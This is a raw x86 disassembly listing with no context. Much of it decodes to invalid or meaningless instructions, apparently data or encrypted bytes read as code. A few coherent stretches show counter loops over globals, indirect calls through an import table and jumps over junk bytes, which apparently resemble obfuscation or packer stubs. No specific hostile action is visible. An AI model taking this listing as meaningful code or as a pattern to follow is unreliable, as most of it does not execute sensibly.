  402084:	repz dec esp
  402086:	les    esp,FWORD PTR [eax-0x585b637f]
  40208c:	mov    ebx,0xd357c8bc
  402091:	jmp    0x4020bd
  402093:	inc    esp
  402094:	sbb    ecx,eax
  402096:	idiv   cl
  402098:	xchg   BYTE PTR [edx+ebp*8-0x18],ah
  40209c:	lea    ebp,[ebx-0x5f]
  40209f:	leave  
  4020a0:	stc    
  4020a1:	cli    
  4020a2:	inc    edx
  4020a3:	int    0xd8
  4020a5:	sub    edx,ebp
  4020a7:	xchg   ecx,eax
  4020a8:	sbb    al,0x57
  4020aa:	mov    cl,0xae
  4020ac:	pop    es
  4020ad:	sbb    BYTE PTR [ecx-0x65],0x42
  4020b1:	ds dec esp
  4020b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020b4:	mov    ebx,0xc65d4a38
  4020b9:	inc    ecx
  4020ba:	stos   BYTE PTR es:[edi],al
  4020bb:	pop    esp
  4020bc:	pusha  
  4020bd:	data16 into 
  4020bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020c0:	dec    eax
  4020c1:	lds    ebp,FWORD PTR [ecx]
  4020c3:	dec    edx
  4020c4:	in     al,dx
  4020c5:	mov    eax,ds:0x41896aad
  4020ca:	sbb    al,0xdc
  4020cc:	push   esi
  4020cd:	sub    eax,0x3416d658
  4020d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020d3:	repz (bad) 
  4020d5:	out    dx,eax
  4020d6:	xor    cl,BYTE PTR [ebp+eiz*4+0x6a114d50]
  4020dd:	or     esi,esi
  4020df:	aaa    
  4020e0:	add    ecx,DWORD PTR [ebx+ecx*8]
  4020e3:	xchg   edi,eax
  4020e4:	push   esi
  4020e5:	shl    ebx,cl
  4020e7:	jmp    0x4020f9
  4020e9:	fucomi st,st(5)
  4020eb:	loopne 0x402131
  4020ed:	sub    BYTE PTR [edx-0x3615a744],bh
  4020f3:	push   0xffffffcf
  4020f5:	sahf   
  4020f6:	xor    BYTE PTR [ecx],bl
  4020f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020f9:	sti    
  4020fa:	sar    BYTE PTR [ecx+0x7ab1fa0f],cl
  402100:	test   eax,0xfd29a9b8
  402105:	fsubr  QWORD PTR [ebx-0x7d]
  402108:	mov    ds:0xedea7244,eax
  40210d:	es retf 
  40210f:	inc    esp
  402110:	jnp    0x4020de
  402112:	dec    esp
  402113:	hlt    
  402114:	fst    DWORD PTR [ecx+esi*2+0x1d]
  402118:	mov    esp,0x7a49a8a8
  40211d:	xchg   edx,eax
  40211e:	sbb    esp,ecx
  402120:	out    dx,eax
  402121:	mov    ds:0xc758d464,al
  402126:	shl    DWORD PTR [ebx-0x7de0c47a],0xff
  40212d:	mov    esp,0x475b0808
  402132:	inc    BYTE PTR [ebp-0x443b04f1]
  402138:	mov    edi,0xea557fd3
  40213d:	pop    eax
  40213e:	push   eax
  40213f:	inc    esp
  402140:	pushf  
  402141:	stc    
  402142:	cmp    BYTE PTR [edx],al
  402144:	fsubr  st(6),st
  402146:	mov    dl,0x18
  402148:	pop    ds
  402149:	or     BYTE PTR [esi],bl
  40214b:	lds    ebp,FWORD PTR [edx-0x3c]
  40214e:	aam    0x14
  402150:	adc    DWORD PTR [esi+0x3b4a13df],ecx
  402156:	jno    0x40216f
  402158:	mov    edi,0x820bd871
  40215d:	aaa    
  40215e:	dec    edx
  40215f:	dec    eax
  402160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402161:	push   ebp
  402162:	xor    bh,ch
  402164:	jge    0x402133
  402166:	push   esp
  402167:	ficom  DWORD PTR [edi]
  402169:	mov    edi,0xf93de5fb
  40216e:	dec    eax
  40216f:	dec    ecx
  402170:	lods   eax,DWORD PTR ds:[esi]
  402171:	cmp    BYTE PTR [ecx+0x51a2a2b5],0xf0
  402178:	fs jecxz 0x4021d0
  40217b:	dec    edx
  40217c:	fadd   QWORD PTR [edi]
  40217e:	loopne 0x4021f1
  402180:	dec    edx
  402181:	jbe    0x4021ae
  402183:	jo     0x402155
  402185:	xor    eax,0xf5b8a830
  40218a:	mov    bl,0xde
  40218c:	and    DWORD PTR [edx],ebp
  40218e:	and    dh,BYTE PTR [esi-0x30d7333]
  402194:	(bad)  
  402195:	(bad)  
  402196:	mov    bl,0x8
  402198:	in     eax,dx
  402199:	add    BYTE PTR [ecx-0x5b],dl
  40219c:	cmp    ebp,ebp
  40219e:	mov    dh,0x93
  4021a0:	aaa    
  4021a1:	and    BYTE PTR [ecx+ecx*1],0x78
  4021a5:	sbb    al,0xe3
  4021a7:	gs test eax,0x53ac8758
  4021ad:	push   esp
  4021ae:	ja     0x402184
  4021b0:	popa   
  4021b1:	sub    ecx,DWORD PTR [ecx+0x65221cdc]
  4021b7:	popa   
  4021b8:	loopne 0x402193
  4021ba:	push   ss
  4021bb:	cmp    eax,edx
  4021bd:	jns    0x402163
  4021bf:	(bad)  
  4021c0:	loop   0x40214a
  4021c2:	jle    0x402199
  4021c4:	add    bl,ch
  4021c6:	das    
  4021c7:	bound  eax,QWORD PTR [esp+eiz*2]
  4021ca:	call   0x4884:0x76a4a2be
  4021d1:	fs sub cl,ah
  4021d4:	xor    cl,ah
  4021d6:	fs into 
  4021d8:	fs pushf 
  4021da:	or     eax,0xb9a790fa
  4021df:	test   al,0x62
  4021e1:	mov    ah,BYTE PTR [ebp+0x7c]
  4021e4:	pop    esp
  4021e5:	jl     0x40224e
  4021e7:	mov    fs,WORD PTR [eax]
  4021e9:	mov    esp,0xf3f1d6a6
  4021ee:	mov    DWORD PTR [ebp+0x69dc1afd],0xa8ef871e
  4021f8:	outs   dx,DWORD PTR ds:[esi]
  4021f9:	imul   ebx,DWORD PTR [eax-0x414182c3],0xe9d1478a
  402203:	dec    ebx
  402204:	cmp    bh,BYTE PTR [ebx+ebx*1]
  402207:	or     BYTE PTR [ecx+edx*8+0x5daaf245],0x9a
  40220f:	dec    esi
  402210:	call   0x6c03:0x5b52bb5c
  402217:	imul   ecx,DWORD PTR ss:[esi],0xe7b64329
  40221e:	mov    ebx,0x4b2384f
  402223:	dec    edx
  402224:	das    
  402225:	dec    eax
  402226:	bound  eax,QWORD PTR [edi-0x7790a785]
  40222c:	push   ebp
  40222d:	adc    DWORD PTR [esp+edx*8-0x1bd44704],0xc26202d2
  402238:	(bad)  ds:0xfbab45fb
  40223e:	call   0x6feb:0x58adc4d1
  402245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402246:	cmp    BYTE PTR [esi-0x22],bl
  402249:	fwait
  40224a:	call   0x15d58051
  40224f:	push   ds
  402250:	add    eax,0xf3fbc41d
  402255:	pop    ecx
  402256:	mov    edi,0xa0cf36f4
  40225b:	push   ds
  40225c:	ins    BYTE PTR es:[edi],dx
  40225d:	shl    DWORD PTR [ebp+0xab36e21],1
  402263:	mov    ds:0xe3797277,al
  402268:	outs   dx,DWORD PTR ds:[esi]
  402269:	addr16 cld 
  40226b:	jns    0x402241
  40226d:	gs ss js 0x402277
  402271:	aaa    
  402272:	sar    DWORD PTR [ebx],1
  402274:	stos   BYTE PTR es:[edi],al
  402275:	dec    ebx
  402276:	in     eax,0x8e
  402278:	data16 ffreep st(5)
  40227b:	jbe    0x4022f5
  40227d:	xchg   esi,eax
  40227e:	add    DWORD PTR [esi+eax*1-0x6e],eax
  402282:	pop    ebp
  402283:	scas   eax,DWORD PTR es:[edi]
  402284:	dec    esp
  402285:	jne    0x40224d
  402287:	loop   0x40221f
  402289:	ja     0x40226e
  40228b:	mov    ah,0xed
  40228d:	leave  
  40228e:	sar    DWORD PTR [edx],1
  402290:	inc    edi
  402291:	je     0x40222c
  402293:	add    ecx,DWORD PTR [ebx+0x11ff641]
  402299:	mov    ds:0x565126b9,al
  40229e:	adc    BYTE PTR [ebx+ebx*2-0x41],bl
  4022a2:	jmp    0x40222d
  4022a4:	and    eax,0x2ce6a73a
  4022a9:	ret    
  4022aa:	fsub   DWORD PTR [esi]
  4022ac:	xlat   BYTE PTR ds:[ebx]
  4022ad:	pop    ss
  4022ae:	pop    ebx
  4022af:	mov    ds:0x90a2fd74,eax
  4022b4:	mov    ebp,0x7a5f2aa7
  4022b9:	cwde   
  4022ba:	pop    ecx
  4022bb:	xor    al,0xd3
  4022bd:	stos   BYTE PTR es:[edi],al
  4022be:	or     al,BYTE PTR [edi-0x7c]
  4022c1:	leave  
  4022c2:	scas   al,BYTE PTR es:[edi]
  4022c3:	and    ebp,0x19
  4022c6:	or     BYTE PTR [eax+0x6400bb5c],bh
  4022cc:	mov    bh,0x95
  4022ce:	mov    ebx,0x29d8586f
  4022d3:	hlt    
  4022d4:	xor    al,0x1a
  4022d6:	jl     0x4022a6
  4022d8:	jecxz  0x402355
  4022da:	sbb    BYTE PTR [ecx],dh
  4022dc:	or     dl,BYTE PTR [ebx]
  4022de:	xor    ah,BYTE PTR [edi]
  4022e0:	stc    
  4022e1:	pop    esp
  4022e2:	and    al,0x67
  4022e4:	push   0xcf2aca1d
  4022e9:	enter  0xdbbb,0xf1
  4022ed:	leave  
  4022ee:	sbb    DWORD PTR [eax],ecx
  4022f0:	pop    eax
  4022f1:	inc    ebp
  4022f2:	jae    0x402346
  4022f4:	sbb    BYTE PTR [edi-0x43a217b7],al
  4022fa:	jge    0x4022ee
  4022fc:	mov    ds:0xcb8bd4f,al
  402301:	sahf   
  402302:	sub    ecx,edi
  402304:	stos   BYTE PTR es:[edi],al
  402305:	pop    ds
  402306:	call   0x34533c07
  40230b:	mov    ebp,0x4fc928ef
  402310:	ins    DWORD PTR es:[edi],dx
  402311:	xchg   ebx,eax
  402312:	sub    esi,ebx
  402314:	fadd   QWORD PTR ds:0xc7e8970a
  40231a:	lahf   
  40231b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40231d:	sub    BYTE PTR [eax+0x79],ah
  402320:	les    ebp,FWORD PTR [ebx+ebx*1+0x43]
  402324:	pop    ss
  402325:	repnz pop ss
  402327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402328:	hlt    
  402329:	add    dl,BYTE PTR ds:0x7ea9785
  40232f:	mov    ecx,ecx
  402331:	loope  0x40231a
  402333:	jnp    0x4022ef
  402335:	cmp    BYTE PTR [eax-0x80],al
  402338:	jl     0x402361
  40233a:	dec    ebx
  40233b:	mov    eax,ds:0x6f3b8ba1
  402340:	xchg   edi,eax
  402341:	pop    esp
  402342:	clc    
  402343:	pop    esp
  402344:	push   esi
  402345:	pop    edx
  402346:	out    dx,al
  402347:	jg     0x4022cb
  402349:	xor    ah,BYTE PTR [ecx+0x4]
  40234c:	or     ecx,edi
  40234e:	xor    DWORD PTR [edi+0x1ff4ee94],edx
  402354:	je     0x402366
  402356:	sbb    DWORD PTR [ebx+0x68858db4],esi
  40235c:	(bad)  
  40235d:	(bad)  
  40235e:	inc    DWORD PTR [ebx-0x77]
  402361:	inc    ebp
  402362:	clc    
  402363:	mov    eax,DWORD PTR [ebp-0x10]
  402366:	xor    DWORD PTR ds:0x433717,ecx
  40236c:	mov    DWORD PTR [ebp-0x24],eax
  40236f:	not    ebx
  402371:	mov    eax,DWORD PTR [ebp-0x1c]
  402374:	or     ebx,DWORD PTR ds:0x4337fb
  40237a:	mov    DWORD PTR [ebp-0x20],eax
  40237d:	and    eax,ebx
  40237f:	mov    ebx,0xf89c853d
  402384:	mov    DWORD PTR [ebp-0x50],ebx
  402387:	mov    eax,DWORD PTR [ebp-0x50]
  40238a:	and    DWORD PTR ds:0x43377b,0x0
  402394:	jmp    0x4023a6
  402399:	mov    ecx,DWORD PTR ds:0x43377b
  40239f:	inc    ecx
  4023a0:	mov    DWORD PTR ds:0x43377b,ecx
  4023a6:	cmp    DWORD PTR ds:0x43377b,0x11
  4023ad:	jae    0x4023dd
  4023b3:	cmp    DWORD PTR ds:0x43377b,0x1b
  4023ba:	jne    0x4023cb
  4023c0:	push   0x4337bf
  4023c5:	call   DWORD PTR ds:0x4121bc
  4023cb:	jmp    0x402399
  4023d0:	movzx  ecx,WORD PTR ds:0x4337f7
  4023d7:	or     DWORD PTR ds:0x433767,ecx
  4023dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4023e0:	xor    eax,esi
  4023e2:	add    eax,edi
  4023e4:	or     DWORD PTR ds:0x433777,0x43383f
  4023ee:	mov    DWORD PTR [ecx],eax
  4023f0:	mov    eax,DWORD PTR [ebp-0x24]
  4023f3:	and    DWORD PTR ds:0x43376f,0x0
  4023fd:	mov    ecx,DWORD PTR ds:0x43376f
  402403:	inc    ecx
  402404:	mov    DWORD PTR ds:0x43376f,ecx
  40240a:	cmp    DWORD PTR ds:0x43376f,0x5
  402411:	jne    0x402436
  402417:	push   DWORD PTR [ebp-0x14]
  40241a:	push   DWORD PTR [ebp-0x18]
  40241d:	push   DWORD PTR [ebp-0x24]
  402420:	push   DWORD PTR [ebp-0x20]
  402423:	push   0x40e6
  402428:	push   0x433910
  40242d:	push   DWORD PTR [ebp-0x10]
  402430:	call   DWORD PTR ds:0x412354
  402436:	cmp    DWORD PTR ds:0x43376f,0x4
  40243d:	jne    0x402450
  402443:	mov    ecx,DWORD PTR ds:0x43376f
  402449:	inc    ecx
  40244a:	mov    DWORD PTR ds:0x43376f,ecx
  402450:	cmp    DWORD PTR ds:0x43376f,0x1d
  402457:	jb     0x4023fd
  40245d:	mov    ecx,DWORD PTR [ebp-0x8]
  402460:	xor    eax,esi
  402462:	add    eax,edi
  402464:	mov    DWORD PTR [ecx+0x4],eax
  402467:	mov    eax,DWORD PTR [ebp-0x2c]
  40246a:	mov    ecx,DWORD PTR [ebp-0x8]
  40246d:	jmp    0x40287b
  402472:	ror    BYTE PTR [ecx-0x3a],cl
  402475:	dec    esi
  402476:	inc    ebp
  402477:	push   ecx
  402478:	push   edx
  402479:	push   ecx
  40247a:	sbb    esp,DWORD PTR [edx+0x7405ac70]
  402480:	out    0x6,al
  402482:	mov    edx,0x6f7e7e01
  402487:	jge    0x402507
  402489:	jle    0x40241a
  40248b:	clc    
  40248c:	sub    al,0x6a
  40248e:	ror    BYTE PTR [ecx],1
  402490:	aad    0x51
  402492:	sbb    al,BYTE PTR [ecx]
  402494:	lods   al,BYTE PTR ds:[esi]
  402495:	or     ch,BYTE PTR [edx+0x18]
  402498:	push   ss
  402499:	pop    edx
  40249a:	cmp    al,0xeb
  40249c:	dec    edi
  40249d:	scas   eax,DWORD PTR es:[edi]
  40249e:	cmovl  eax,DWORD PTR [edi+ebx*4-0x7c]
  4024a3:	jge    0x402475
  4024a5:	fwait
  4024a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024a7:	adc    ecx,ebp
  4024a9:	inc    eax
  4024aa:	dec    eax
  4024ab:	fwait
  4024ac:	or     DWORD PTR [edx],0x6c
  4024af:	mov    dh,dh
  4024b1:	mov    al,ds:0xf320a7a4
  4024b6:	jne    0x402471
  4024b8:	ds (bad) 
  4024bb:	sahf   
  4024bc:	cmp    BYTE PTR [edx+0x5f],cl
  4024bf:	inc    edx
  4024c0:	sub    ebp,DWORD PTR [edi-0x37]
  4024c3:	scas   al,BYTE PTR es:[edi]
  4024c4:	call   0x4ca70318
  4024c9:	push   edi
  4024ca:	call   FWORD PTR [ecx+0x29eb0713]
  4024d0:	cs cmp eax,0x89b03635
  4024d6:	mov    eax,0x4edf4ba3
  4024db:	adc    ebp,DWORD PTR [ebx+ebp*4-0x2867957f]
  4024e2:	dec    eax
  4024e3:	xchg   ebx,eax
  4024e4:	and    al,0xc8
  4024e6:	dec    esi
  4024e7:	addr16 push es
  4024e9:	cmp    bh,ah
  4024eb:	pushf  
  4024ec:	call   0xe4232c02
  4024f1:	rcr    DWORD PTR [eax-0x57f5a2b9],1
  4024f7:	xchg   edi,eax
  4024f8:	or     al,0xa6
  4024fa:	sbb    al,0x50
  4024fc:	inc    esi
  4024fd:	pop    ebx
  4024fe:	arpl   sp,cx
  402500:	xor    esi,DWORD PTR [edx*1-0x7129ec40]
  402507:	cdq    
  402508:	out    dx,eax
  402509:	in     eax,dx
  40250a:	push   esp
  40250b:	ss jbe 0x402578
  40250e:	imul   edi,DWORD PTR [edx+0x77],0x54
  402512:	js     0x4024de
  402514:	pop    ebx
  402515:	pop    ds
  402516:	dec    edx
  402517:	cmp    DWORD PTR [edi],edi
  402519:	iret   
  40251a:	mov    esp,0xee29fc9b
  40251f:	lds    edx,FWORD PTR [edx+ebx*4]
  402522:	mov    bh,0x65
  402524:	xor    BYTE PTR [ecx+0x46],cl
  402527:	fs ins DWORD PTR es:[edi],dx
  402529:	fdivr  st,st(7)
  40252b:	push   ss
  40252c:	daa    
  40252d:	das    
  40252e:	shr    BYTE PTR [edi],0x49
  402531:	sbb    DWORD PTR [eax+0x3bd36f9e],0xb8078090
  40253b:	jbe    0x4024d8
  40253d:	xor    eax,DWORD PTR [edi+edx*4+0xa]
  402541:	add    bh,BYTE PTR [eax]
  402543:	xor    eax,0xef0a9d39
  402548:	dec    esi
  402549:	inc    ecx
  40254a:	mov    ch,0x44
  40254c:	pop    esp
  40254d:	pushf  
  40254e:	and    DWORD PTR [esi+0x4f],0x7ec17131
  402555:	pop    ecx
  402556:	and    bl,BYTE PTR [edi+0x5de9fc3c]
  40255c:	xor    bh,bl
  40255e:	sub    eax,0xfffffff3
  402561:	ss inc edx
  402563:	and    BYTE PTR [esi-0x426104b],bl
  402569:	push   ss
  40256a:	inc    esp
  40256b:	xor    ecx,DWORD PTR ds:0xe2a10b89
  402571:	mov    eax,esi
  402573:	or     BYTE PTR [edx+0x74],dl
  402576:	daa    
  402577:	arpl   WORD PTR [ecx],bx
  402579:	dec    ecx
  40257a:	mov    dl,al
  40257c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40257d:	inc    esi
  40257e:	adc    dh,dl
  402580:	and    al,0x23
  402582:	loop   0x402566
  402584:	mov    al,ch
  402586:	push   0xffffff9c
  402588:	pushf  
  402589:	push   eax
  40258a:	sub    al,0xed
  40258c:	fwait
  40258d:	imul   esi,eax,0xc5c8fcbf
  402593:	mov    cl,0x69
  402595:	addr16 jo 0x402615
  402598:	sub    BYTE PTR [edx-0x1c],bl
  40259b:	jmp    0xd37d:0x2821d611
  4025a2:	sbb    al,al
  4025a4:	and    eax,0xad717b0c
  4025a9:	pop    esp
  4025aa:	sar    DWORD PTR [ebx+esi*8+0x4a],1
  4025ae:	fadd   st,st(2)
  4025b0:	cld    
  4025b1:	outs   dx,DWORD PTR ds:[esi]
  4025b2:	call   FWORD PTR [edx-0x35]
  4025b5:	cld    
  4025b6:	xor    BYTE PTR [ecx-0x14],ah
  4025b9:	icebp  
  4025ba:	pop    ebx
  4025bb:	xor    eax,DWORD PTR [ecx]
  4025bd:	adc    eax,DWORD PTR [esi-0x526e9672]
  4025c3:	popa   
  4025c4:	js     0x4025ec
  4025c6:	enter  0xac39,0xe7
  4025ca:	mov    ecx,0x117daf81
  4025cf:	inc    edi
  4025d0:	rcl    BYTE PTR [esi+ecx*2],cl
  4025d3:	pop    ecx
  4025d4:	daa    
  4025d5:	cmp    BYTE PTR [edx],bh
  4025d7:	maxps  xmm5,XMMWORD PTR [ebx+0x167b33c0]
  4025de:	xchg   ecx,eax
  4025df:	fidiv  WORD PTR [edi+edi*1]
  4025e2:	pop    edi
  4025e3:	jb     0x40259b
  4025e5:	inc    edi
  4025e6:	push   ebx
  4025e7:	rcr    edx,1
  4025e9:	cmp    al,0xe
  4025eb:	and    BYTE PTR ds:0xc82ac6bc,ch
  4025f1:	in     eax,0x2f
  4025f3:	add    al,0x9b
  4025f5:	and    BYTE PTR ds:[ecx+0x39],bh
  4025f9:	ret    0x4b0f
  4025fc:	test   dh,cl
  4025fe:	jecxz  0x402621
  402600:	cmp    al,0x4f
  402602:	test   BYTE PTR [esi+0x4c],ch
  402605:	mov    eax,0xe78cd5e6
  40260a:	dec    ebp
  40260b:	jp     0x4025fd
  40260d:	inc    ebp
  40260e:	fisttp DWORD PTR [eax-0x6c86c0f4]
  402614:	std    
  402615:	push   ds
  402616:	sbb    DWORD PTR [ebx-0x643d6c00],eax
  40261c:	mov    esp,0x47faa949
  402621:	pop    edi
  402622:	pop    edx
  402623:	push   esi
  402624:	inc    ecx
  402625:	adc    eax,0x55e54e59
  40262a:	inc    ecx
  40262b:	and    eax,0xcadc31c8
  402630:	mov    ah,0x9
  402632:	sahf   
  402633:	les    esp,FWORD PTR [edx]
  402635:	int    0x5f
  402637:	scas   al,BYTE PTR es:[edi]
  402638:	mul    DWORD PTR [edx-0x145d6856]
  40263e:	aaa    
  40263f:	mov    esp,0xee7e4af8
  402644:	xor    al,0x5e
  402646:	xchg   ebx,eax
  402647:	adc    al,0x19
  402649:	lods   al,BYTE PTR ds:[esi]
  40264a:	cwde   
  40264b:	ret    
  40264c:	dec    ebp
  40264d:	popa   
  40264e:	test   BYTE PTR [esi+edi*1+0x0],dl
  402652:	pop    es
  402653:	cmc    
  402654:	hlt    
  402655:	and    eax,0x80080a86
  40265a:	stos   BYTE PTR es:[edi],al
  40265b:	xor    cl,ch
  40265d:	lds    esp,FWORD PTR [ebx+ecx*8-0x1a]
  402661:	shl    DWORD PTR [edx],0x32
  402664:	retf   0xbc71
  402667:	test   BYTE PTR [ebx],al
  402669:	enter  0x7,0x45
  40266d:	dec    ebx
  40266e:	mov    ebx,0xeb1333d8
  402673:	popf   
  402674:	nop
  402675:	hlt    
  402676:	dec    edx
  402677:	push   edi
  402678:	cwde   
  402679:	add    eax,DWORD PTR [ebx-0x57]
  40267c:	sub    DWORD PTR [esi+0x39585ef7],esp
  402682:	mov    BYTE PTR [esi+0x69bd35ec],al
  402688:	push   edx
  402689:	je     0x402646
  40268b:	in     eax,dx
  40268c:	xor    BYTE PTR [edi],ch
  40268e:	jne    0x402687
  402690:	mov    ds:0xc92a702a,eax
  402695:	or     DWORD PTR [ebx-0x2c],eax
  402698:	mov    dl,0xb
  40269a:	or     BYTE PTR [edi],dh
  40269c:	enter  0x3e55,0xf7
  4026a0:	rcl    BYTE PTR [edi],1
  4026a2:	pop    eax
  4026a3:	pop    ebp
  4026a4:	jmp    0xe233a0c7
  4026a9:	mov    edi,0x5c112e28
  4026ae:	pop    esp
  4026af:	adc    BYTE PTR [esi],cl
  4026b1:	jae    0x402682
  4026b3:	sub    eax,0x97f9604a
  4026b8:	lock inc ecx
  4026ba:	out    0x81,eax
  4026bc:	or     al,BYTE PTR [edx+eiz*8-0x3a0fa62a]
  4026c3:	adc    ebp,ebp
  4026c5:	pop    ebp
  4026c6:	inc    ecx
  4026c7:	es push 0x22
  4026ca:	ds mov edi,0x1970d842
  4026d0:	mov    ?,WORD PTR [esi+ecx*1-0x6318ca2a]
  4026d7:	cmp    DWORD PTR [ebx],ebp
  4026d9:	pop    esp
  4026da:	pop    es
  4026db:	push   cs
  4026dc:	mov    ebp,0xe3ab7863
  4026e1:	inc    ebp
  4026e2:	jle    0x402711
  4026e4:	sub    esi,edi
  4026e6:	and    al,0x3d
  4026e8:	fs daa 
  4026ea:	shr    esi,0xec
  4026ed:	mov    al,ds:0xe1a67855
  4026f2:	(bad)  
  4026f3:	mov    eax,0x83729693
  4026f8:	pop    edx
  4026f9:	sbb    dh,BYTE PTR [esi]
  4026fb:	adc    eax,DWORD PTR [ebx]
  4026fd:	cli    
  4026fe:	ja     0x40271c
  402700:	jl     0x402708
  402702:	mov    bl,0x39
  402704:	stos   DWORD PTR es:[edi],eax
  402705:	mov    al,0x36
  402707:	jmp    0x40274a
  402709:	ret    
  40270a:	and    eax,0x76297ddc
  40270f:	scas   eax,DWORD PTR es:[edi]
  402710:	out    dx,eax
  402711:	stc    
  402712:	mov    DWORD PTR [ebp-0x5e],0x28c8e6e4
  402719:	or     esp,DWORD PTR [ecx+0x59]
  40271c:	jns    0x402710
  40271e:	jge    0x4026e0
  402720:	cwde   
  402721:	sub    eax,0x1923e4a7
  402726:	bnd ret 0x2914
  40272a:	shr    DWORD PTR ds:0x37801cfc,cl
  402730:	pop    eax
  402731:	call   0xe6a4744a
  402736:	cmp    ah,BYTE PTR [ebx]
  402738:	push   esi
  402739:	sar    ch,0xa1
  40273c:	sub    eax,0x9e9e3e5
  402741:	mov    ch,0x5e
  402743:	ror    DWORD PTR [edx+0xf],cl
  402746:	repnz mov es,WORD PTR [esi]
  402749:	fwait
  40274a:	jl     0x402722
  40274c:	mov    esi,0x80a2a206
  402751:	xchg   esp,eax
  402752:	jecxz  0x402738
  402754:	sub    al,0xa4
  402756:	addr16 mov eax,ds:0x916b
  40275a:	ja     0x4027ab
  40275c:	ror    BYTE PTR [esi-0x39],cl
  40275f:	ror    ecx,0xd8
  402762:	and    bl,BYTE PTR ds:0x6c3957fa
  402768:	or     eax,0x882ab753
  40276d:	jl     0x4027c4
  40276f:	pop    ecx
  402770:	cwde   
  402771:	out    dx,al
  402772:	jmp    0x402778
  402774:	jle    0x40275c
  402776:	or     esp,DWORD PTR [edx+0x7b]
  402779:	sub    eax,0x7960a938
  40277e:	jg     0x4027e7
  402780:	pop    ebx
  402781:	jp     0x402716
  402783:	xchg   esi,eax
  402784:	int3   
  402785:	je     0x40271d
  402787:	sbb    al,0xda
  402789:	fs stos DWORD PTR es:[edi],eax
  40278b:	pop    esi
  40278c:	and    eax,0xb4b3f647
  402791:	popf   
  402792:	sub    DWORD PTR [ecx+0x133b7858],ebx
  402798:	loopne 0x402760
  40279a:	icebp  
  40279b:	loope  0x402747
  40279d:	mov    esi,0x35f97a2e
  4027a2:	idiv   BYTE PTR [ecx+0x41]
  4027a5:	test   BYTE PTR [eax],cl
  4027a7:	lds    ebx,FWORD PTR [edi]
  4027a9:	and    al,0x85
  4027ab:	fst    QWORD PTR [edx]
  4027ad:	(bad)  
  4027af:	mov    ebx,0x4cb15b6e
  4027b4:	xchg   edi,eax
  4027b5:	mov    ch,0x8f
  4027b7:	or     dh,cl
  4027b9:	pop    esi
  4027ba:	jecxz  0x40279c
  4027bc:	dec    ecx
  4027bd:	sub    DWORD PTR [edx+ebx*1-0x697ba71],esp
  4027c4:	mov    eax,0x5c42cdc5
  4027c9:	mov    cl,0xb4
  4027cb:	mov    eax,DWORD PTR [edi-0x17dd380c]
  4027d1:	test   al,0x8d
  4027d3:	jnp    0x4027b6
  4027d5:	pusha  
  4027d6:	shl    BYTE PTR [ebp+0x6815725a],1
  4027dc:	dec    ebx
  4027dd:	push   0x2f
  4027df:	adc    eax,0xb9144a7a
  4027e4:	std    
  4027e5:	fidivr DWORD PTR [esi+0x48dc4a58]
  4027eb:	test   al,0xf9
  4027ed:	sbb    BYTE PTR [ebx+0x247084ff],cl
  4027f3:	pusha  
  4027f4:	jo     0x402838
  4027f6:	leave  
  4027f7:	adc    cl,BYTE PTR [eax]
  4027f9:	cmp    ah,0xa2
  4027fc:	xor    al,0x44
  4027fe:	shl    esi,0x70
  402801:	aas    
  402802:	push   ebx
  402803:	pop    esp
  402804:	pushf  
  402805:	sbb    dl,0x6d
  402808:	in     eax,0x8a
  40280a:	mov    esp,0x41e3bd6a
  40280f:	(bad)  
  402810:	jno    0x402803
  402812:	out    dx,al
  402813:	cmc    
  402814:	jmp    FWORD PTR [esp+eiz*2+0x17248fc7]
  40281b:	shl    DWORD PTR [edx-0x79c714dc],1
  402821:	push   edx
  402822:	jp     0x40289f
  402824:	je     0x40282f
  402826:	cmp    BYTE PTR [edx+ebp*4+0x73],ch
  40282a:	sbb    eax,0x9f626624
  40282f:	fwait
  402830:	adc    BYTE PTR [ebp-0x41],ah
  402833:	and    ah,BYTE PTR [ecx+0x626f4fd]
  402839:	in     eax,dx
  40283a:	cdq    
  40283b:	out    dx,al
  40283c:	sub    eax,0x2107959a
  402841:	or     dl,BYTE PTR [esi-0x77]
  402844:	and    DWORD PTR [bp+di+0x11d9],ebx
  402849:	leave  
  40284a:	jno    0x4028c7
  40284c:	icebp  
  40284d:	pop    ecx
  40284e:	sbb    ch,bl
  402850:	stc    
  402851:	out    dx,eax
  402852:	jecxz  0x402854
  402854:	mov    edx,DWORD PTR [ebx+0x1e]
  402857:	jnp    0x402860
  402859:	bound  ebx,QWORD PTR [edi]
  40285b:	cli    
  40285c:	inc    esi
  40285d:	(bad)  
  40285e:	or     eax,DWORD PTR [ebp+0x128e420]
  402864:	sub    al,0x18
  402866:	scas   al,BYTE PTR es:[edi]
  402867:	mov    dh,bl
  402869:	xor    ah,bh
  40286b:	mov    al,ds:0x182ffaae
  402870:	(bad)  
  402871:	mov    al,ds:0xdd75fe11
  402876:	mov    dl,0x97
  402878:	retf   
  402879:	add    al,0x33
  40287b:	mov    DWORD PTR [ecx+0x8],eax
  40287e:	mov    eax,DWORD PTR [ebp-0x30]
  402881:	mov    ecx,DWORD PTR [ebp-0x8]
  402884:	mov    DWORD PTR [ecx+0xc],eax
  402887:	mov    eax,DWORD PTR [ebp-0x34]
  40288a:	mov    ecx,DWORD PTR [ebp-0x8]
  40288d:	mov    DWORD PTR [ecx+0x10],eax
  402890:	mov    eax,eax
  402892:	mov    eax,DWORD PTR [ebp-0x20]
  402895:	xor    eax,esi
  402897:	add    eax,edi
  402899:	je     0x402cd8
  40289f:	lea    eax,[ebp-0x98]
  4028a5:	push   eax
  4028a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4028a9:	xor    eax,esi
  4028ab:	add    eax,edi
  4028ad:	push   eax
  4028ae:	mov    eax,DWORD PTR [ebp-0x18]
  4028b1:	jmp    0x402cbf
  4028b6:	xor    eax,DWORD PTR [ebx]
  4028b8:	mov    dl,0xa
  4028ba:	mov    dl,0xab
  4028bc:	mov    bl,0x23
  4028be:	sbb    al,0x86
  4028c0:	adc    al,BYTE PTR [ebx-0x4f7a734]
